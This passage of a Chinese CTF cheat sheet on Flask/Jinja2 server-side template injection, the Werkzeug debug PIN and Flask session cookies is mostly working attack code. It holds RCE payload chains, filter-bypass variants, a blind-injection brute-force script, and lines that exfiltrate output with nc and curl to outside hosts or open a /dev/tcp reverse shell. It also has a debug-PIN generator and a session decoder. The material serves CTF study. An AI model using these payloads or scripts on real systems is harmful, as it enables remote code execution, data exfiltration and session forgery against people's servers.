+<h4 id="81-ssti"><a href="#81-ssti" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8.1 ssti</h4>
+<p><em><strong>基础:</strong></em></p>
+<p>入门:<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p>
+<p>漏洞成因在于：<strong><code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，<code>{{}}</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换。比如<code>{{1+1}}</code>会被解析成2。</strong></p>
+<p>在CTF中ssti经常存在404中&hellip;</p>
+<p>常识:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="vm">__class__</span> <span class="o">//</span><span class="err">返回调用的参数类型。</span>
+<span class="n">__base__</span> <span class="o">//</span><span class="err">对象的一个基类，一般情况下是</span><span class="nb">object</span><span class="err">，有时不是，这时需要使用下一个方法</span>
+<span class="vm">__mro__</span> <span class="o">//</span><span class="err">同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，</span><span class="n">object在最底层故在列表中的最后</span><span class="err">，通过</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="err">可以获取到</span>
+<span class="n">__subclasses__</span><span class="p">()</span> <span class="o">//</span><span class="err">继承此对象的子类，返回一个列表</span>
+
+<span class="err">魔术函数</span>
+    <span class="n">__dict__类的静态函数</span><span class="err">、类函数、普通函数、全局变量以及一些内置的属性都是放在类的</span><span class="n">__dict__里的对象的__dict__中存储了一些self</span><span class="o">.</span><span class="n">xxx的一些东西内置的数据类型没有__dict__属性每个类有自己的__dict__属性</span><span class="err">，就算存在继承关系，父类的</span><span class="vm">__dict__</span> <span class="err">并不会影响子类的</span><span class="n">__dict__对象也有自己的__dict__属性</span><span class="err">，</span> <span class="err">存储</span><span class="bp">self</span><span class="o">.</span><span class="n">xxx</span> <span class="err">信息，父子类对象公用</span><span class="vm">__dict__</span>
+
+    <span class="n">__globals__该属性是函数特有的属性</span><span class="p">,</span><span class="err">记录当前文件全局变量的值</span><span class="p">,</span><span class="err">如果某个文件调用了</span><span class="n">os</span><span class="err">、</span><span class="n">sys等库</span><span class="p">,</span><span class="err">但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用</span><span class="n">globals属性访问全局的变量</span><span class="err">。该属性保存的是函数全局变量的字典引用。</span>
+
+    <span class="fm">__getattribute__</span><span class="p">()</span><span class="err">实例、类、函数都具有的</span><span class="n">__getattribute__魔术方法</span><span class="err">。事实上，在实例化的对象进行</span><span class="o">.</span><span class="err">操作的时候（形如：</span><span class="n">a</span><span class="o">.</span><span class="n">xxx</span><span class="o">/</span><span class="n">a</span><span class="o">.</span><span class="n">xxx</span><span class="p">()</span><span class="err">），都会自动去调用</span><span class="n">__getattribute__方法</span><span class="err">。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span> <span class="k">print</span> <span class="n">i</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><em><strong>多行python语句</strong></em></p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre><p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p><em><strong>寻找RCE的类</strong></em></p>
+<p>python2</p>
+<pre><code>#python2
+num = 0
+for item in ''.__class__.__mro__[-1].__subclasses__():
+    try:
+        if 'os' in item.__init__.__globals__:
+            print num,item
+        num+=1
+    except:
+        num+=1
+</code></pre><p>python3</p>
+<pre><code>#!/usr/bin/python3
+# coding=utf-8
+# python 3.5
+from flask import Flask
+from jinja2 import Template
+# Some of special names
+searchList = ['__init__', &quot;__new__&quot;, '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', &quot;__instancecheck__&quot;, '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
+neededFunction = ['eval', 'open', 'exec','os']
+pay = int(input(&quot;Payload?[1|0]&quot;))
+for index, i in enumerate({}.__class__.__base__.__subclasses__()):
+    for attr in searchList:
+        if hasattr(i, attr):
+            if eval('str(i.'+attr+')[1:9]') == 'function':
+                for goal in neededFunction:
+                    if (eval('&quot;'+goal+'&quot; in i.'+attr+'.__globals__[&quot;__builtins__&quot;].keys()')):
+                        if pay != 1:
+                            print(i.__name__,&quot;:&quot;, attr, goal)
+                        else:
+                            print(&quot;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='&quot; + i.__name__ + &quot;' %}{{ c.&quot; + attr + &quot;.__globals__['__builtins__'].&quot; + goal + &quot;(\&quot;[evil]\&quot;) }}{% endif %}{% endfor %}&quot;)
+</code></pre><p><em><strong>无回显</strong></em></p>
+<pre><code>''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls | nc xx.xxx.xx.xx 44444')
+</code></pre><p>盲注</p>
+<pre><code>import requests
+
+url = 'http://127.0.0.1:8080/'
+
+def check(payload):
+    postdata = {
+        'exploit':payload
+        }
+    r = requests.post(url, data=postdata).content
+    return '~p0~' in r
+
+password  = ''
+s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$'()*+,-./:;&lt;=&gt;?@[\]^`{|}~'&quot;_%'
+
+for i in xrange(0,100):
+    for c in s:
+        payload = '{% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/test&quot;).read()['+str(i)+':'+str(i+1)+'] == &quot;'+c+'&quot; %}~p0~{% endif %}'
+        if check(payload):
+            password += c
+            break
+    print password
+</code></pre><p><em><strong>Bypass</strong></em></p>
+<p>拼接:</p>
+<pre><code>object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
+
+().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
+</code></pre><p>编码:</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64'))
+</code></pre><p>过滤中括号[]:</p>
+<pre><code>getitem()
+&quot;&quot;.__class__.__mro__[2]
+&quot;&quot;.__class__.__mro__.__getitem__(2)
+pop()
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
+</code></pre><p>过滤引号:</p>
+<pre><code>先获取chr函数，赋值给chr，后面拼接字符串
+{% set
+chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr
+%}{{
+().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()
+}}
+
+借助request对象:
+{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
+将其中的request.args改为request.values则利用post的方式进行传参
+</code></pre><p>过滤下划线_:</p>
+<pre><code>{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
+}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+</code></pre><p>过滤{{:</p>
+<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
+</code></pre><p>内建函数删除:</p>
+<pre><code>del __builtins__.__dict__['__import__']
+del __builtins__.__dict__['eval']
+del __builtins__.__dict__['execfile']
+
+reload(__builtins__)
+</code></pre><p>过滤[:</p>
+<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
+</code></pre><p>过滤class:</p>
+<pre><code> request['__cl'+'ass__'].__mro__[12]}}
+ 
+ {{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}
+</code></pre><p>其他:</p>
+<pre><code>不利用__globals__
+[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('ls')
+
+timeit
+import timeit
+timeit.timeit(&quot;__import__('os').system('dir')&quot;,number=1)
+
+platfor
+import platform
+print platform.popen('dir').read()
+</code></pre><p>一些poc:</p>
+<pre><code>python2:
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).system(&quot;ls&quot;)')
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system(&quot;ls&quot;)')
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;')
+
+python3：
+{{{}.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('this_is_the_fl'+'ag.txt').read()}}
+{{[].__class__.__mro__[1].__subclasses__()[174].__init__.__globals__['__builtins__']['ev'+'al'](__import__('os').popen('dir').read())}}
+{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al'](&quot;__imp&quot;+&quot;ort_&quot;+&quot;_('o&quot;+&quot;s').po&quot;+&quot;pen('dir').read()&quot;)}}
+
+open('flag').__getattribute__('read')()
+
+{{{}[request[&quot;form&quot;][&quot;param&quot;]][request[&quot;form&quot;][&quot;base&quot;]][request[&quot;form&quot;][&quot;subclasses&quot;]]()[103][request[&quot;form&quot;][&quot;init&quot;]][request[&quot;form&quot;][&quot;globals&quot;]][request[&quot;form&quot;][&quot;builtins&quot;]]['eval'](request[&quot;form&quot;][&quot;args&quot;])}}
+POST： param=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;args=__import__('os').popen('dir').read()
+
+</code></pre><p><a href="https://www.anquanke.com/post/id/188172#h3-10" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a></p>
+<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p>
+<h4 id="82-pin码"><a href="#82-pin码" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8.2 pin码</h4>
+<p>Flask debug模式下，存在读取配置文件。</p>
+<p><a href="https://www.anquanke.com/post/id/197602?display=mobile" target="_blank" rel="noopener">从一道ctf题谈谈flask开启debug模式存在的安全问题</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;flaskweb&#39;</span><span class="c1"># username,etc/passwd</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+    <span class="s1">&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),debug</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;2485377957891&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+    <span class="s1">&#39;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#39;</span><span class="c1"># get_machine_id(),/proc/self/cgroup, /etc/machine-id</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<h4 id="83-flask-session"><a href="#83-flask-session" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8.3 flask-session</h4>
+<p>seesion通过序列化对键以及键值进行进行序列化，通过hmacsha1进行签名，最终生成一串字符串</p>
+<p>流程为：json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</p>
+<p>解密session可能会获得有用信息。</p>
+<p>伪造session需要SECRET_KEY，SECRET_KEY常通过文件读取或者爆破获取。</p>
+<p>解密py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">session_json_serializer</span>
+<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>
+
+<span class="k">def</span> <span class="nf">decryption</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">decompress</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">if</span> <span class="n">payload</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+        <span class="n">decompress</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Could not base64 decode the payload because of &#39;</span>
+                         <span class="s1">&#39;an exception&#39;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">decompress</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Could not zlib decompress the payload before &#39;</span>
+                             <span class="s1">&#39;decoding the payload&#39;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">session_json_serializer</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">decryption</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></p>
+<p>工具：</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">加解密session</a></p>
+<p><a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">SECRET_KEY 爆破</a></p>
+<p>CTF：</p>
+<p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=53404&amp;fromuid=295700" target="_blank" rel="noopener">以CTF角度看待flask session安全问题</a></p>
+<p><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a></p>
+<hr>
